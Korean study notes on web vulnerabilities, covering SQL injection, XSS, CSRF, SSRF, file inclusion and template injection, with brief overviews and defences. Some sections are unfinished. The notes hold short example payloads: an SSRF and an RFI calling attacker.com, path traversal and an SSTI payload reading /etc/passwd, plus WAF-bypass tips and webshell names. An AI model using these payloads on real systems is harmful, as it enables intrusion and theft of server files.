1. SQL injection

 개요, 목적, 발생 조건
 - 사용자의 입력값 검증 미흡으로 인한 공격이다.
 - 사용 목적은 크게 3가지로 데이터 노출, 조건 우회, 원격코드 실행이다.
 - 발생 조건은 '나 "를 넣어 오류가 나오거나 서버의 반응을 본다.
 
 공격 벡터
 - 기본적으로 웹 구조에서 데이터베이스에 쿼리를 보낼 수 있을 거 같은 곳에 공격을 한다. (로그인, 회원가입, 검색바 등)
 - URL의 매개 변수 : http://test.com/product.php?id=123 or 1=1
 - HTTP Header : User-Agent, Referer, Cookie 등 요청 헤더를 통해 공격이 가능하다.
 - Cookie : 쿠키 값도 검증하지 않으면 공격 벡터로 사용이 가능하다.

 방어 기법
 - 특수문자 필터링
 - Prepared statement 사용
 - WAF 설치
 - 오류 메세지, 디버깅 페이지 노출 금지

 union
 - order by : 
 - null : 
 
 blind
 - SUBSTRING(), MID() : 
 - LENGTH() : 
 - ASCII(), ORD() : 

 error
 - extractvalue() : 
 - updatexml() : 
 - floor() + group by + count() : 
 - concat() : 

 time
 - sleep() : 
 - waitfor delay : 


 MySQL
 - version(), user(), database(), @@hostname, GROUP_CONCAT(), CONCAT(), information_schema.tables, information_schema.columns

 PostgreSQL
 - version(), current_user, current_database(), CONCAT(), pg_catalog.pg_tables, pg_catalog.pg_columns

 MS SQL Serv
 - @@version, SUSER_SNAME(), DB_NAME(), HOST_NAME(), CONCAT(), INFORMATION_SCHEMA.TABLES, INFORMATION_SCHEMA.COLUMNS

 waf bypass
 - url, hex, unicode, base64 encode 사용
 - sql comment 사용
 - case mix, 키워드 대체, sql 함수 사용
 - 비표준 공백 문자 사용, 불필요한 괄호나 기호 삽입


2. Code injection

 개요, 목적, 발생 조건
 - 서버의 모든 입력값을 완벽하게 검증 할 수 없기에 발생한 코드 삽입 공격이다.
 - 공격 목적은 원격 코드 실행, 백도어 설치, 정보 유출이 있다.
 - 발생 조건은 퍼징 때려서 얻어 걸리는 것이다.

 공격 벡터
 - 입력이 가능한 모든 부분

 방어 기법
 - 가용성, 최적화를 최대한으로 생각한 시큐어 코딩
 - WAF, UTM등 보안장비 사용

SQLi
XSS
OS Command
LDAP
XPath
XXE
CSS
Lang Code (php, python, js)
File inclusion injection (LFI, RFI)
SSI
HTTP header
CRLF
SSTI
NoSQL
ORM
SOAP


3. XSS

 개요, 목적, 발생 조건
 - 서버가 아닌 사용자를 공격하기 위한 목적으로 js코드를 사용하여 데이터 노출, 원격 코드 실행을 유발한다.
 - 발생 조건은 특수문자 필터링 확인, CSP 정책 미흡으로 확인가능하다.

 공격 벡터
 - 

 방어 기법
 - 특수문자 필터링
 - HTML ENTITY 인코딩
 - CSP 설정

 Stored
 - 

 Reflect
 - 

 DOM
 - 


4. CSRF
 
 개요 및 목적
 - 모든 사용자를 목적을 하는 XSS와는 다르게 권한이 있는 사용자를 대상으로 한 공격이며 해커가 원하는 행동을 자동화한 코드를 삽입하여 사용자가 특정 게시물에 방문하면 해커가 원하는 코드가 실행되게 한다.

 imagetag onclick
 session riding
 referer 

5. SSRF
 
 개요 및 목적
 - 서버측에서 위조된 http 요청을 하여 서버 내부 자원에 접근하여 외부로 데이터 유출 및 오작동을 유발한다.
 - ex ) 
 http://victim.com/connect?url=http://attacker.com/admin/admin.php
 http://victim.com/connect?url=http://bit.ly/sdjk3kjhkl3
 http://victim.com/connect?url=file:///etc/passwd


6. File Upload
 
 개요 및 목적
 - 파일 업로드시 확장자 필터링 미흡으로 인한 악성 파일 업로드 공격

 Webshell
 - 404 위장
 - c100
 - b374


7. file Download
 
 개요 및 목적
 - url 접근 설정 미흡으로 인한 서버의 민감 파일 노출 공격


8. LFI
 
 개요 및 목적
 - 서버 내부에 있는 파일을 웹페이지에 포함해서 읽어오도록 조작하는 취약점이다.
 - SSRF와 다른점은 https 요청을 조작하는 서버 네트워크 요청을 악용하는 것과는 달리 파일 경로를 조작하여 서버의 파일 포함 기능인 include() 등을 악용하는 공격이다.
 - ex)
 http://victim.com/index.php?page=/../../../../etc/passwd


9. RFI
 
 개요 및 목적
 - 서버가 외부 특정 파일을 요청하고 실행하는 URL 요청 공격이다.
 - ex)
 https://victim.com/index.php?filename=https://attacker.com/malware.php


A. ssti

 개요 및 목적
 - 사용자의 입력값 검증 미흡으로 인한 웹 템플릿 구문 공격이다. 서버가 공격 대상이다.
 - ex)
 {{ get_flashes_messages.__globals__.__builtins__.open(/etc/passwd).read() }}


B. csti

 개요 및 목적
 - 사용자의 입력값 검증 미흡으로 인한 웹 템플릿 구문 공격이다. 클라이언트가 공격 대상이다.
 - ex)
 {{-function(){this.alert(1)}()}}


C. rpo

 개요 및 목적
 - 서버와 브라우저가 상대 경로를 해석과정에서 발생하는 취약점
 - 발생 조건은 URL Rewrite가 적용이 되어 있는 웹사이트


D. idor


-1. CSP, CORS



출처 : 
 - 이글루 ssrf https://www.igloo.co.kr/security-information/ssrf-%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9%EC%82%AC%EB%A1%80-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91%EB%B0%A9%EC%95%88/
 - kisa 시큐어 코딩 가이드 https://www.kisa.or.kr/2060204/form?postSeq=5&lang_type=KO&page=1
 - hahwul csti https://www.hahwul.com/cullinan/attack/csti/

